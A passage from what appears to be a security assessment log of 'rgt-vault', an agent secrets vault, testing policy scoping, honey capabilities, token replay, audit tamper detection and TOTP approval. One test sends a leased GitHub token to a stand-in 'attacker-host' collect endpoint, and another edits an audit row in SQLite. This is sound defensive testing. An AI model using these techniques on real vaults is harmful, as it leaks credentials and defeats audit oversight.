{"allowed":true,"reason":"Allow rule matched","matched_rule":{"effect":"allow","agent":"*","namespace":"*","purpose":"*","action":"*"}}
[exit 0]

$ env RGT_VAULT_TOKEN_FILE=coder.token rgt-vault simulate --namespace github --purpose billing --action read
{"allowed":true,"reason":"Allow rule matched","matched_rule":{"effect":"allow","agent":"*","namespace":"*","purpose":"*","action":"*"}}
[exit 0]

$ env RGT_VAULT_TOKEN_FILE=coder.token rgt-vault get GITHUB_TOKEN --namespace github
Error: get failed: HTTP 403
[exit 1]

$ env RGT_VAULT_TOKEN_FILE=rogue.token rgt-vault list --namespace github
GITHUB_TOKEN	2026-11-28T03:42:11.539344+00:00
[exit 0]

$ env RGT_VAULT_TOKEN_FILE=deploy.token rgt-vault get DEPLOY_KEY --namespace deploy
deploy-key-material-123
[exit 0]

## (note: the earlier server from section A was still running with the allow-all policy; restarting with the scoped policy)

$ rgt-vault serve --policy policy.yaml --allow-private-network --harness-key-file ~/.config/rgt-vault/harness.key &
2026/11/27 22:42:26 Token store: ~/.config/rgt-vault/tokens.json (5 tokens, 1 with operator scope)
2026/11/27 22:42:26 WARNING: --allow-private-network enables the built-in HTTP actions to call loopback / RFC1918 addresses. Any caller with a valid bearer token can use this to probe internal services (SSRF). Only enable on trusted networks.
==============================================
  rgt-vault server
  Listening on 127.0.0.1:8765
  Vault: ~/.secure-vault/vault.db (id de1f0677-81eb-47c9-ab98-fbe80c1a3fba, epoch 1)
  Health check: http://127.0.0.1:8765/healthz
  Auth: per-agent tokens from ~/.config/rgt-vault/tokens.json (5)
==============================================
2026/11/27 22:42:26 Starting HTTP server on 127.0.0.1:8765

## C2. Scoped policy now active

$ env RGT_VAULT_TOKEN_FILE=coder.token rgt-vault simulate --namespace github --purpose ci-build --action read
{"allowed":true,"reason":"Allow rule matched","matched_rule":{"effect":"allow","agent":"coder","namespace":"github","purpose":"ci*","action":"read","ttl":60}}
[exit 0]

$ env RGT_VAULT_TOKEN_FILE=coder.token rgt-vault simulate --namespace github --purpose billing --action read
{"allowed":false,"reason":"No matching allow rule (default deny)","matched_rule":null}
[exit 0]

$ env RGT_VAULT_TOKEN_FILE=rogue.token rgt-vault list --namespace github
Error: list failed: HTTP 403
[exit 1]

$ env RGT_VAULT_TOKEN_FILE=coder.token rgt-vault list --namespace deploy
Error: list failed: HTTP 403
[exit 1]

$ env RGT_VAULT_TOKEN_FILE=coder.token rgt-vault get GITHUB_TOKEN --namespace github
Error: get failed: HTTP 403
[exit 1]

## C3. Agent USES the secret through a server-side action (the product's core promise)

$ curl -X GET :8765/v1/actions  [as coder]
{"actions":[{"description":"POST to an OpenAI-compatible /v1/chat/completions endpoint. The leased secret is sent as a Bearer token. Returns the upstream response (status, headers, body_text).","name":"openai_chat","params_schema":["model","messages","base_url","max_tokens","temperature"]},{"description":"GET a URL with the leased secret as a Bearer token.","name":"http_get_with_auth","params_schema":["url","headers"]},{"description":"POST to a URL with the leased secret as a Bearer token.","name":"http_post_with_auth","params_schema":["url","body","headers"]},{"description":"Diagnostic. Returns a fixed object confirming the lease worked; the secret is NEVER included in the response.","name":"echo","params_schema":["message"]}]}

[HTTP 200]

$ curl -X POST :8765/v1/secrets/github/GITHUB_TOKEN/use  [as coder]  -d '{"action":"echo","purpose":"ci-build"}'
{"action":"echo","ok":true,"result":{"leaked_secret":false,"message":"lease ok; secret NOT returned","ok":true,"secret_len":39}}

[HTTP 200]

$ curl -X POST :8765/v1/secrets/github/GITHUB_TOKEN/use  [as coder]  -d '{"action":"http_get_with_auth","purpose":"ci-build","params":{"url":"https://127.0.0.1:18443/user"}}'
{"action":"http_get_with_auth","ok":true,"result":{"body_text":"{\"authenticated\": true, \"path\": \"/user\", \"method\": \"GET\", \"login\": \"octo-demo\", \"body_bytes\": 0}","content_type":"application/json","headers":{"Content-Length":"96","Content-Type":"application/json","Date":"Sat, 28 Nov 2026 03:42:42 GMT","Server":"BaseHTTP/0.6 Python/3.12.3"},"status":200,"truncated":false}}

[HTTP 200]

$ curl -X POST :8765/v1/secrets/github/GITHUB_TOKEN/use  [as coder]  -d '{"action":"http_post_with_auth","purpose":"ci-build","params":{"url":"https://localhost:18443/repos/demo/issues","body":{"title":"filed by agent"}}}'
{"action":"http_post_with_auth","ok":true,"result":{"body_text":"{\"authenticated\": true, \"path\": \"/repos/demo/issues\", \"method\": \"POST\", \"login\": \"octo-demo\", \"body_bytes\": 26}","content_type":"application/json","headers":{"Content-Length":"111","Content-Type":"application/json","Date":"Sat, 28 Nov 2026 03:42:42 GMT","Server":"BaseHTTP/0.6 Python/3.12.3"},"status":200,"truncated":false}}

[HTTP 200]

$ curl -X POST :8765/v1/secrets/github/GITHUB_TOKEN/use  [as coder]  -d '{"action":"http_get_with_auth","purpose":"billing","params":{"url":"https://127.0.0.1:18443/user"}}'
{"error":"PolicyDeniedError","detail":"Agent 'coder' denied read access to 'GITHUB_TOKEN' (github/billing)","incident_id":"8cb4c46d8a8758ed"}

[HTTP 403]

$ curl -X POST :8765/v1/secrets/github/GITHUB_TOKEN/use  [as rogue]  -d '{"action":"echo","purpose":"ci-build"}'
{"error":"PolicyDeniedError","detail":"Agent 'rogue' denied read access to 'GITHUB_TOKEN' (github/ci-build)","incident_id":"77cb31cd4a6983ea"}

[HTTP 403]

$ curl -X POST :8765/v1/secrets/github/GITHUB_TOKEN/use  [as coder]  -d '{"action":"http_get_with_auth","purpose":"ci-build","agent":"operator","params":{"url":"https://127.0.0.1:18443/user"}}'
{"error":"AuthorizationError","detail":"agent does not match the authenticated token","incident_id":"57b97e9738912f72"}

[HTTP 403]

$ curl -X POST :8765/v1/secrets/github/GITHUB_TOKEN/lease  [as coder]  -d '{"purpose":"ci-build"}'
{"error":"AuthorizationError","detail":"insufficient scope for this route","incident_id":"d4861048aa300f7a"}

[HTTP 403]

$ curl -X GET :8765/v1/secrets?namespace=github&name=GITHUB_TOKEN  [as coder]
{"error":"ValidationError","detail":"the name= filter was removed: read a value with POST /v1/secrets/{namespace}/{name}/lease (lease scope)","incident_id":"62f772f6ce54c88a"}

[HTTP 400]
mockapi GET /user auth INVALID or absent
mockapi GET /user auth valid
mockapi POST /repos/demo/issues auth valid

## C4. Destination binding: can an agent that may USE the GitHub token send it to a host of its choosing?

$ curl -X POST :8765/v1/secrets/github/GITHUB_TOKEN/use  [as coder]  -d '{"action":"http_get_with_auth","purpose":"ci-build","params":{"url":"https://localhost:18444/collect"}}'
{"action":"http_get_with_auth","ok":true,"result":{"body_text":"ok","content_type":"text/plain","headers":{"Content-Length":"2","Date":"Sat, 28 Nov 2026 03:42:58 GMT","Server":"BaseHTTP/0.6 Python/3.12.3"},"status":200,"truncated":false}}

[HTTP 200]
attacker-host got request /collect; Authorization header present=True, credential length=39

## C5. SSRF guard without the dev flag is tested later (server restarted without --allow-private-network)

## C6. Capabilities endpoint + honey trap

$ curl -X GET :8765/v1/capabilities  [as coder]
{"capabilities":[{"name":"secrets.echo","description":"Diagnostic capability. Returns a fixed shape; never includes secrets.","supported_versions":[1],"params_schema":["message"]},{"name":"secrets.use","description":"Lease a stored secret and run a registered v0.2 action against it. Bridges legacy server-side actions into the capability model.","supported_versions":[1],"params_schema":["secret_name","namespace","action","params"]}]}

[HTTP 200]

$ curl -X GET :8765/v1/capabilities/list  [as coder]
{"agent":"coder","capabilities":[]}

[HTTP 200]

$ curl -X POST :8765/v1/capabilities/execute  [as rogue]  -d '{"capability":"aws.admin.full","agent_id":"rogue","capability_token":"x.y","payload":{}}'
{"error":"PolicyDeniedError","detail":"capability token rejected: token base64 decode failed","incident_id":"9ca3223e28a872fa"}

[HTTP 403]

$ curl -X POST :8765/v1/capabilities/execute  [as rogue]  -d '{"capability":"github.admin.delete_org","agent_id":"rogue","capability_token":"x.y","payload":{"org":"acme"}}'
{"error":"PolicyDeniedError","detail":"capability token rejected: token base64 decode failed","incident_id":"2e613d83eb6e75aa"}

[HTTP 403]

$ curl -X POST :8765/v1/capabilities/execute  [as rogue]  -d '{"capability":"not.a.real.cap","agent_id":"rogue","capability_token":"x.y","payload":{}}'
{"error":"PolicyDeniedError","detail":"capability token rejected: token base64 decode failed","incident_id":"bf11a36e604a7b34"}

[HTTP 403]

$ curl -X POST :8765/v1/capabilities/execute  [as coder]  -d '{"capability":"secrets.echo","agent_id":"coder","capability_token":"x.y","payload":{}}'
{"error":"PolicyDeniedError","detail":"capability token rejected: token base64 decode failed","incident_id":"e56ddb5685ce0033"}

[HTTP 403]
2026/11/27 22:42:58 HTTP GET /v1/capabilities -> 200 (517µs)
2026/11/27 22:42:58 HTTP GET /v1/capabilities/list -> 200 (502µs)
2026/11/27 22:42:58 WARNING: security event HONEY_CAPABILITY_TRIGGERED request="" agent="rogue" operator="" detail="honey capability \"aws.admin.full\" probed via capability.execute (version 1, token presented: true)"
2026/11/27 22:42:58 WARNING incident=9ca3223e28a872fa status=403 error=PolicyDeniedError path=/v1/capabilities/execute
2026/11/27 22:42:58 HTTP POST /v1/capabilities/execute -> 403 (657µs)
2026/11/27 22:42:58 WARNING: security event HONEY_CAPABILITY_TRIGGERED request="" agent="rogue" operator="" detail="honey capability \"github.admin.delete_org\" probed via capability.execute (version 1, token presented: true)"
2026/11/27 22:42:58 WARNING incident=2e613d83eb6e75aa status=403 error=PolicyDeniedError path=/v1/capabilities/execute
2026/11/27 22:42:58 HTTP POST /v1/capabilities/execute -> 403 (608µs)
2026/11/27 22:42:58 WARNING incident=bf11a36e604a7b34 status=403 error=PolicyDeniedError path=/v1/capabilities/execute
2026/11/27 22:42:58 HTTP POST /v1/capabilities/execute -> 403 (442µs)
2026/11/27 22:42:58 WARNING incident=e56ddb5685ce0033 status=403 error=PolicyDeniedError path=/v1/capabilities/execute
2026/11/27 22:42:58 HTTP POST /v1/capabilities/execute -> 403 (589µs)

## C7. Capability execution with a v2 capability token (no CLI mints one; signed here with a 12-line script from the wire format in captoken/token.go)

$ curl -X POST :8765/v1/capabilities/execute  [as coder]  -d '{"capability":"secrets.echo","agent_id":"coder","capability_token":"<signed-test-token>","payload":{"message":"hi"}}'
{"capability":"secrets.echo","ok":true,"result":{"agent_id":"coder","capability":"secrets.echo","message":"hi","ok":true,"token_id":"0f7f317cb30f639f"}}

[HTTP 200]

$ curl -X POST :8765/v1/capabilities/execute  [as coder]  -d '{"capability":"secrets.echo","agent_id":"coder","capability_token":"<signed-test-token>","payload":{"message":"replay"}}'
{"error":"PolicyDeniedError","detail":"capability token rejected: capability token already used","incident_id":"8ffdbbb06d60f1fd"}

[HTTP 403]

$ curl -X POST :8765/v1/capabilities/execute  [as coder]  -d '{"capability":"secrets.use","agent_id":"coder","capability_token":"<signed-test-token>","payload":{"secret_name":"GITHUB_TOKEN","namespace":"github","action":"http_get_with_auth","params":{"url":"https://127.0.0.1:18443/user"}}}'
{"error":"ActionExecutionError","detail":"capability 'secrets.use' failed; see server logs for details","incident_id":"d20355168b35d828"}

[HTTP 500]

$ curl -X POST :8765/v1/capabilities/execute  [as rogue]  -d '{"capability":"secrets.use","agent_id":"rogue","capability_token":"<signed-test-token>","payload":{"secret_name":"GITHUB_TOKEN","namespace":"github","action":"echo","params":{}}}'
{"error":"PolicyDeniedError","detail":"token bound to agent 'coder', caller claimed 'rogue'","incident_id":"4f757da0c0e24f3d"}

[HTTP 403]

$ curl -X POST :8765/v1/capabilities/execute  [as rogue]  -d '{"capability":"aws.admin.full","agent_id":"rogue","capability_token":"<signed-test-token>","payload":{}}'
{"error":"CapabilityNotFoundError","detail":"unknown capability 'aws.admin.full'. Registered: ['secrets.echo', 'secrets.use']","incident_id":"45135470b413a80b"}

[HTTP 404]

$ curl -X GET :8765/v1/capabilities/list  [as coder]
{"agent":"coder","capabilities":[]}

[HTTP 200]

## C8. Audit: view, scope enforcement, verify, tamper detection

$ rgt-vault audit --limit 400 | python3 -I -c "import json,sys,collections; e=json.load(sys.stdin)['entries']; print(len(e),'rows'); [print(' ',k,v) for k,v in collections.Counter(x['action'] for x in e).most_common()]"
116 rows
  HTTP_API 39
  HOOK_READ 8
  CAPABILITY_DENIED 6
  GET_SECRET 6
  HOOK_LIST 6
  POLICY_DENIED 5
  LEASE_RETURNED 5
  LEASE_GRANTED 5
  AUTHZ_DENIED 5
  SIMULATION_RUN 4
  HOOK_SIMULATE 4
  LIST_SECRETS 4
  TOKEN_MINTED 4
  HOOK_CAPABILITY 3
  HONEY_CAPABILITY_TRIGGERED 3
  SET_SECRET 3
  HOOK_WRITE 3
  CAPABILITY_FAILED 1
  CAPABILITY_EXECUTED 1
  SECRET_READ 1
[exit 0]

$ rgt-vault audit --limit 400 | python3 -I -c "import json,sys; e=json.load(sys.stdin)['entries']; [print(x['id'],x['timestamp'][11:19],x['action'],x['agent_id'],x['secret_name'],(x['details'] or '')[:150]) for x in reversed(e) if x['action'] in('HONEY_CAPABILITY_TRIGGERED','POLICY_DENIED','ACCESS_DENIED','AUTHZ_DENIED','LEASE_GRANTED','CAPABILITY_EXECUTED','CAPABILITY_DENIED','SET_SECRET')][-0:]"
4 03:40:30 SET_SECRET None api-key Version 1 created in prod
8 03:40:30 AUTHZ_DENIED operator None token=tok_<id> ip=127.0.0.1 POST /v1/secrets/prod/api-key/lease reason=missing scope agent+lease
18 03:42:11 SET_SECRET None GITHUB_TOKEN Version 1 created in github
21 03:42:11 SET_SECRET None DEPLOY_KEY Version 1 created in deploy
34 03:42:11 AUTHZ_DENIED coder None token=tok_<id> ip=127.0.0.1 POST /v1/secrets/github/GITHUB_TOKEN/lease reason=missing scope agent+lease
41 03:42:11 LEASE_GRANTED None DEPLOY_KEY Agent: deploy_bot
52 03:42:42 POLICY_DENIED None None Action: list, Agent: rogue, Namespace: github, Reason: Explicit deny rule matched
55 03:42:42 POLICY_DENIED None None Action: list, Agent: coder, Namespace: deploy, Reason: No matching allow rule (default deny)
56 03:42:42 AUTHZ_DENIED coder None token=tok_<id> ip=127.0.0.1 POST /v1/secrets/github/GITHUB_TOKEN/lease reason=missing scope agent+lease
61 03:42:42 LEASE_GRANTED None GITHUB_TOKEN Agent: coder
66 03:42:42 LEASE_GRANTED None GITHUB_TOKEN Agent: coder
71 03:42:42 LEASE_GRANTED None GITHUB_TOKEN Agent: coder
75 03:42:42 POLICY_DENIED None GITHUB_TOKEN Action: read, Agent: coder, Namespace: github, Reason: No matching allow rule (default deny)
78 03:42:42 POLICY_DENIED None GITHUB_TOKEN Action: read, Agent: rogue, Namespace: github, Reason: Explicit deny rule matched
80 03:42:42 AUTHZ_DENIED coder None token=tok_<id> ip=127.0.0.1 POST /v1/secrets/github/GITHUB_TOKEN/use reason=agent mismatch (claimed operator)
81 03:42:42 AUTHZ_DENIED coder None token=tok_<id> ip=127.0.0.1 POST /v1/secrets/github/GITHUB_TOKEN/lease reason=missing scope agent+lease
86 03:42:58 LEASE_GRANTED None GITHUB_TOKEN Agent: coder
91 03:42:58 HONEY_CAPABILITY_TRIGGERED None None {"agent": "rogue", "capability": "aws.admin.full", "capability_version": 1, "severity": "critical", "source": "capability.execute", "token_presented":
92 03:42:58 CAPABILITY_DENIED None None {"agent": "rogue", "capability": "aws.admin.full", "capability_version": 1, "reason": "token: TokenMalformedError"}
94 03:42:58 HONEY_CAPABILITY_TRIGGERED None None {"agent": "rogue", "capability": "github.admin.delete_org", "capability_version": 1, "severity": "critical", "source": "capability.execute", "token_pr
95 03:42:58 CAPABILITY_DENIED None None {"agent": "rogue", "capability": "github.admin.delete_org", "capability_version": 1, "reason": "token: TokenMalformedError"}
97 03:42:58 CAPABILITY_DENIED None None {"agent": "rogue", "capability": "not.a.real.cap", "capability_version": 1, "reason": "token: TokenMalformedError"}
99 03:42:58 CAPABILITY_DENIED None None {"agent": "coder", "capability": "secrets.echo", "capability_version": 1, "reason": "token: TokenMalformedError"}
102 03:43:22 CAPABILITY_EXECUTED None None {"agent": "coder", "capability": "secrets.echo", "capability_version": 1, "hook": "off", "allowed": true, "context_hash": "adbd982b8fe0bbd8"}
104 03:43:22 CAPABILITY_DENIED None None {"agent": "coder", "capability": "secrets.echo", "capability_version": 1, "reason": "token: TokenReplayError"}
108 03:43:22 POLICY_DENIED None GITHUB_TOKEN Action: read, Agent: coder, Namespace: github, Reason: No matching allow rule (default deny)
111 03:43:22 CAPABILITY_DENIED None None {"agent": "rogue", "capability": "secrets.use", "capability_version": 1, "reason": "agent mismatch"}
113 03:43:22 HONEY_CAPABILITY_TRIGGERED None None {"agent": "rogue", "capability": "aws.admin.full", "capability_version": 1, "severity": "critical", "source": "capability.execute", "token_presented":
[exit 0]

$ env RGT_VAULT_TOKEN_FILE=coder.token rgt-vault audit --limit 3
Error: audit failed: HTTP 403
[exit 1]

$ env RGT_VAULT_TOKEN_FILE=auditor.token rgt-vault verify-audit
OK
[exit 0]

$ rgt-vault verify-audit
OK
[exit 0]

## C8b. Audit rows written for ONE /use call with http_get_with_auth (ids 83-88): is the action/destination recorded?

$ rgt-vault audit --limit 400 | python3 -I -c "import json,sys; e=json.load(sys.stdin)['entries']; [print(x['id'],x['action'],'agent_id=%s'%x['agent_id'],x['secret_name'],x['details']) for x in reversed(e) if 83<=x['id']<=88]"
83 HTTP_API agent_id=coder None token=tok_<id> ip=127.0.0.1 POST /v1/secrets/github/GITHUB_TOKEN/use
84 HOOK_READ agent_id=None GITHUB_TOKEN {"hook_id": "off", "decision": "allow", "reason": "hook disabled"}
85 GET_SECRET agent_id=None GITHUB_TOKEN Version latest accessed from github
86 LEASE_GRANTED agent_id=None GITHUB_TOKEN Agent: coder
87 LEASE_RETURNED agent_id=None GITHUB_TOKEN Agent: coder
88 HTTP_API agent_id=coder None token=tok_<id> ip=127.0.0.1 GET /v1/capabilities
[exit 0]

## C9. Tamper detection (edit one audit row directly in SQLite, server stopped)

$ rgt-vault verify-audit --offline
OK
[exit 0]
tables: ['schema_migrations', 'sqlite_sequence', 'audit_logs', 'secrets', 'honeytokens', 'metadata']
tampered row 61

$ rgt-vault verify-audit --offline
TAMPERED
Error: audit chain verification failed (first invalid entry: audit_logs id 61)
[exit 2]

$ rgt-vault status --offline
vault_id:     de1f0677-81eb-47c9-ab98-fbe80c1a3fba
key_epoch:    1
active secrets: 3
  deploy: 1
  github: 1
  prod: 1
audit rows:   121
last action:  2026-11-28T03:43:44.563278+00:00  HTTP_API  -
audit chain:  TAMPERED
Error: audit chain verification failed (first invalid entry: audit_logs id 61)
[exit 2]

$ rgt-vault migrate check
database:     ~/.secure-vault/vault.db
vault_id:     de1f0677-81eb-47c9-ab98-fbe80c1a3fba
key_epoch:    1
migrations:   1,2,3,4,5
secrets:      3 rows (dek_version 1: 3)
keychain:     keychain.json version 1, kdf argon2id, key_epoch 1
audit rows:   121
audit chain:  TAMPERED
verdict:      NOT READY (audit chain)
Error: audit chain verification failed (first invalid entry: audit_logs id 61)
[exit 2]
restored row 61

$ rgt-vault verify-audit --offline
OK
[exit 0]

## D. Approval + TOTP

$ rgt-vault enroll-2fa --account will-demo | sed -E 's/(secret=)[A-Z2-7]+/\1<redacted>/; s/^(secret:? *)[A-Z2-7]{16,}/\1<redacted>/'
TOTP secret written to: ~/.config/rgt-vault/totp.secret (mode 0600)
The provisioning URI and secret were not printed because stdout is not a terminal;
re-run with --show-secret (and --force to replace this one), or read the file yourself.

Start the daemon with:  rgt-vault serve --require-approval --operator-token-file <operator token> --totp-secret-file ~/.config/rgt-vault/totp.secret
[exit 0]
total 24
drwx------ 2 will will 4096 Nov 27 22:43 .
drwx------ 3 will will 4096 Nov 27 22:40 ..
-rw------- 1 will will   65 Nov 27 22:42 harness.key
-rw------- 1 will will   45 Nov 27 22:40 operator.token
-rw------- 1 will will 1375 Nov 27 22:42 tokens.json
-rw------- 1 will will    0 Nov 27 22:40 tokens.json.lock
-rw------- 1 will will   33 Nov 27 22:43 totp.secret

$ rgt-vault serve --policy policy.yaml --allow-private-network --require-approval --totp-secret-file ~/.config/rgt-vault/totp.secret --approval-timeout 20s &
2026/11/27 22:43:56 Token store: ~/.config/rgt-vault/tokens.json (5 tokens, 1 with operator scope)
2026/11/27 22:43:56 WARNING: --allow-private-network enables the built-in HTTP actions to call loopback / RFC1918 addresses. Any caller with a valid bearer token can use this to probe internal services (SSRF). Only enable on trusted networks.
2026/11/27 22:43:56 No --harness-key-file: /v1/capabilities/execute fails closed
==============================================
  rgt-vault server
  Listening on 127.0.0.1:8765
  Vault: ~/.secure-vault/vault.db (id de1f0677-81eb-47c9-ab98-fbe80c1a3fba, epoch 1)
  Health check: http://127.0.0.1:8765/healthz
  Auth: per-agent tokens from ~/.config/rgt-vault/tokens.json (5)
==============================================
2026/11/27 22:43:56 Starting HTTP server on 127.0.0.1:8765

$ curl -X POST :8765/v1/secrets  [as operator]  -d '{"name":"PROD_DB_PASSWORD","namespace":"github","value":"<redacted-test-value>","purpose":"setup","require_2fa":true,"note":"prod db; needs TOTP"}'
{"name":"PROD_DB_PASSWORD","namespace":"github","ok":true}

[HTTP 200]

## D1. Agent request blocks until a human approves (no 2FA secret)

$ curl -X POST :8765/v1/secrets/github/GITHUB_TOKEN/use  [as coder]  -d '{"action":"http_get_with_auth","purpose":"ci-build","params":{"url":"https://127.0.0.1:18443/user"}}'

$ curl -X GET :8765/v1/requests  [as operator]
{"requests":[{"action":"read","agent":"coder","created_at":1795837450.9292324,"namespace":"github","purpose":"ci-build","request_id":"964b0fbb-45d2-4b76-9fe9-29547a97e16e","require_2fa":false,"secret_name":"GITHUB_TOKEN"}]}

[HTTP 200]

$ curl -X POST :8765/v1/requests//approve  [as coder]  -d '{}'
{"error":"BadRequest","detail":"Invalid URI path","incident_id":"5a2bc37d378e2e76"}

[HTTP 400]

$ curl -X POST :8765/v1/requests//approve  [as operator]  -d '{"operator":"will"}'
{"error":"BadRequest","detail":"Invalid URI path","incident_id":"17b3cefa1177d5e4"}

[HTTP 400]

[HTTP 000]

$ curl -X POST :8765/v1/secrets/github/GITHUB_TOKEN/use  [as coder]  -d '{"action":"http_get_with_auth","purpose":"ci-build","params":{"url":"https://127.0.0.1:18443/user"}}'

[HTTP 000]

## D2. 2FA-required secret: approve without code, wrong code, then right code, then replay

$ curl -X POST :8765/v1/secrets/github/PROD_DB_PASSWORD/use  [as coder]  -d '{"action":"echo","purpose":"ci-build"}'

$ curl -X GET :8765/v1/requests  [as operator]
{"requests":[{"action":"read","agent":"coder","created_at":1795837470.952331,"namespace":"github","purpose":"ci-build","request_id":"86b2f665-b4c5-43a3-aef9-4d710f92ceb7","require_2fa":true,"secret_name":"PROD_DB_PASSWORD"}]}

[HTTP 200]

$ curl -X POST :8765/v1/requests//approve  [as operator]  -d '{"operator":"will"}'
{"error":"BadRequest","detail":"Invalid URI path","incident_id":"305a9b3503edd0ac"}

[HTTP 400]

$ curl -X POST :8765/v1/requests//approve  [as operator]  -d '{"operator":"will","totp_code":"<code>"}'
{"error":"BadRequest","detail":"Invalid URI path","incident_id":"f9dcdb5232490234"}

[HTTP 400]

$ curl -X POST :8765/v1/requests//approve  [as operator]  -d '{"operator":"will","totp_code":"<code>"}'
{"error":"BadRequest","detail":"Invalid URI path","incident_id":"929240f7242e6f52"}

[HTTP 400]

[HTTP 000]

$ curl -X POST :8765/v1/secrets/github/PROD_DB_PASSWORD/use  [as coder]  -d '{"action":"echo","purpose":"ci-build"}'

[HTTP 000]

$ curl -X POST :8765/v1/secrets/github/PROD_DB_PASSWORD/use  [as coder]  -d '{"action":"echo","purpose":"ci-build"}'

$ curl -X POST :8765/v1/requests//approve  [as operator]  -d '{"operator":"will","totp_code":"<code>"}'
{"error":"BadRequest","detail":"Invalid URI path","incident_id":"88cf9edf1e3df309"}

[HTTP 400]

$ curl -X POST :8765/v1/requests//deny  [as operator]  -d '{"operator":"will","reason":"not expected right now"}'
{"error":"BadRequest","detail":"Invalid URI path","incident_id":"350ebaa30c8526c8"}

[HTTP 400]

[HTTP 000]

$ curl -X POST :8765/v1/secrets/github/PROD_DB_PASSWORD/use  [as coder]  -d '{"action":"echo","purpose":"ci-build"}'

[HTTP 000]

## D3. Timeout: nobody answers (approval-timeout 20s)

$ curl -X POST :8765/v1/secrets/github/GITHUB_TOKEN/use  [as coder]  -d '{"action":"echo","purpose":"ci-build"}'

[HTTP 000]
2026/11/27 22:43:56 WARNING: --allow-private-network enables the built-in HTTP actions to call loopback / RFC1918 addresses. Any caller with a valid bearer token can use this to probe internal services (SSRF). Only enable on trusted networks.
2026/11/27 22:44:12 WARNING incident=5a2bc37d378e2e76 status=400 error=BadRequest method=POST path=/v1/requests//approve
2026/11/27 22:44:12 WARNING incident=17b3cefa1177d5e4 status=400 error=BadRequest method=POST path=/v1/requests//approve
2026/11/27 22:44:30 WARNING incident=8396d125af6a62b0 status=403 error=PolicyDeniedError path=/v1/secrets/github/GITHUB_TOKEN/use
2026/11/27 22:44:32 WARNING incident=305a9b3503edd0ac status=400 error=BadRequest method=POST path=/v1/requests//approve
2026/11/27 22:44:32 WARNING incident=f9dcdb5232490234 status=400 error=BadRequest method=POST path=/v1/requests//approve
2026/11/27 22:44:32 WARNING incident=929240f7242e6f52 status=400 error=BadRequest method=POST path=/v1/requests//approve
2026/11/27 22:44:50 WARNING incident=78908a884114477c status=403 error=PolicyDeniedError path=/v1/secrets/github/PROD_DB_PASSWORD/use
2026/11/27 22:44:52 WARNING incident=88cf9edf1e3df309 status=400 error=BadRequest method=POST path=/v1/requests//approve
2026/11/27 22:44:52 WARNING incident=350ebaa30c8526c8 status=400 error=BadRequest method=POST path=/v1/requests//deny
2026/11/27 22:45:10 WARNING incident=55fddeef2cf52a27 status=403 error=PolicyDeniedError path=/v1/secrets/github/PROD_DB_PASSWORD/use
2026/11/27 22:45:31 WARNING incident=43fcfdfb8cf16913 status=403 error=PolicyDeniedError path=/v1/secrets/github/GITHUB_TOKEN/use

## (ASSESSOR NOTE: section D1-D3 above is invalid: my script read the wrong JSON field ('id' instead of 'request_id') and my curl timeout equalled the approval timeout. Re-run follows.)

## D1'. Agent request blocks until a human approves (secret without require_2fa)

$ curl -X POST :8765/v1/secrets/github/GITHUB_TOKEN/use  [as coder]  -d '{"action":"http_get_with_auth","purpose":"ci-build","params":{"url":"https://127.0.0.1:18443/user"}}'

$ curl -X POST :8765/v1/requests/8ee2206d-d830-468b-b200-446ab1f133c4/approve  [as coder]  -d '{}'
{"error":"AuthorizationError","detail":"insufficient scope for this route","incident_id":"44e4c7082698e83f"}

[HTTP 403]

$ curl -X POST :8765/v1/requests/8ee2206d-d830-468b-b200-446ab1f133c4/approve  [as operator]  -d '{"operator":"will"}'
{"error":"AuthorizationError","detail":"agent does not match the authenticated token","incident_id":"2e75752c35b7fcb3"}

[HTTP 403]
{"error":"PolicyDeniedError","detail":"Agent 'coder' approval denied for 'GITHUB_TOKEN' (github/ci-build): approval timed out after 20s","incident_id":"5b1865e0508df2da"}

[HTTP 403]

$ curl -X POST :8765/v1/secrets/github/GITHUB_TOKEN/use  [as coder]  -d '{"action":"http_get_with_auth","purpose":"ci-build","params":{"url":"https://127.0.0.1:18443/user"}}'
{"error":"PolicyDeniedError","detail":"Agent 'coder' approval denied for 'GITHUB_TOKEN' (github/ci-build): approval timed out after 20s","incident_id":"5b1865e0508df2da"}

[HTTP 403]

## D2'. 2FA-required secret: approve without code, wrong code, right code; then replay of the same code; then deny

$ curl -X POST :8765/v1/secrets/github/PROD_DB_PASSWORD/use  [as coder]  -d '{"action":"echo","purpose":"ci-build"}'

$ curl -X POST :8765/v1/requests/29279445-1807-41b0-9270-0f206e3b8817/approve  [as operator]  -d '{"operator":"will"}'
{"error":"AuthorizationError","detail":"agent does not match the authenticated token","incident_id":"29b908e152d8d73e"}

[HTTP 403]

$ curl -X POST :8765/v1/requests/29279445-1807-41b0-9270-0f206e3b8817/approve  [as operator]  -d '{"operator":"will","totp_code":"<code>"}'
{"error":"AuthorizationError","detail":"agent does not match the authenticated token","incident_id":"ec40b9fd784b0eea"}

[HTTP 403]

$ curl -X POST :8765/v1/requests/29279445-1807-41b0-9270-0f206e3b8817/approve  [as operator]  -d '{"operator":"will","totp_code":"<code>"}'
{"error":"AuthorizationError","detail":"agent does not match the authenticated token","incident_id":"f392ab88fd4caf7b"}

[HTTP 403]
{"error":"PolicyDeniedError","detail":"Agent 'coder' approval denied for 'PROD_DB_PASSWORD' (github/ci-build): approval timed out after 20s","incident_id":"57bc85a890fb29a9"}

[HTTP 403]

$ curl -X POST :8765/v1/secrets/github/PROD_DB_PASSWORD/use  [as coder]  -d '{"action":"echo","purpose":"ci-build"}'
{"error":"PolicyDeniedError","detail":"Agent 'coder' approval denied for 'PROD_DB_PASSWORD' (github/ci-build): approval timed out after 20s","incident_id":"57bc85a890fb29a9"}

[HTTP 403]

$ curl -X POST :8765/v1/secrets/github/PROD_DB_PASSWORD/use  [as coder]  -d '{"action":"echo","purpose":"ci-build"}'

$ curl -X POST :8765/v1/requests/51db1c53-4cdd-4ca7-9eee-c744942d541b/approve  [as operator]  -d '{"operator":"will","totp_code":"<code>"}'
{"error":"AuthorizationError","detail":"agent does not match the authenticated token","incident_id":"5c60910dbadcb393"}

[HTTP 403]

$ curl -X POST :8765/v1/requests/51db1c53-4cdd-4ca7-9eee-c744942d541b/deny  [as operator]  -d '{"operator":"will","reason":"not expected right now"}'
{"error":"AuthorizationError","detail":"agent does not match the authenticated token","incident_id":"08fd7b11176eb7da"}

[HTTP 403]
{"error":"PolicyDeniedError","detail":"Agent 'coder' approval denied for 'PROD_DB_PASSWORD' (github/ci-build): approval timed out after 20s","incident_id":"78fe712b9218c361"}

[HTTP 403]

$ curl -X POST :8765/v1/secrets/github/PROD_DB_PASSWORD/use  [as coder]  -d '{"action":"echo","purpose":"ci-build"}'
